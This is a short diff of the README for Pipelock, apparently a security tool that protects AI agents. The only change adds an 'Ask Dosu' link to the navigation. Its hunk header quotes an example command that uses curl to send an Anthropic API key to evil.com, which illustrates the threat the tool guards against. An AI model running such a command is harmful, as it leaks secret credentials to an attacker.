@@ -24,7 +24,7 @@ curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over, unless pipel
 
 **Works with:** Claude Code · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph · Cursor
 
-[Quick Start](#quick-start) · [Integration Guides](#integration-guides) · [Docs](docs/) · [Blog](https://pipelab.org/blog/)
+[Quick Start](#quick-start) · [Integration Guides](#integration-guides) · [Docs](docs/) · [Blog](https://pipelab.org/blog/) · [Ask Dosu](https://app.dosu.dev/bcccd1cf-be85-4c0e-ae05-edeb0ff50b59/ask)
 
 ![Pipelock demo](assets/demo.gif)
 
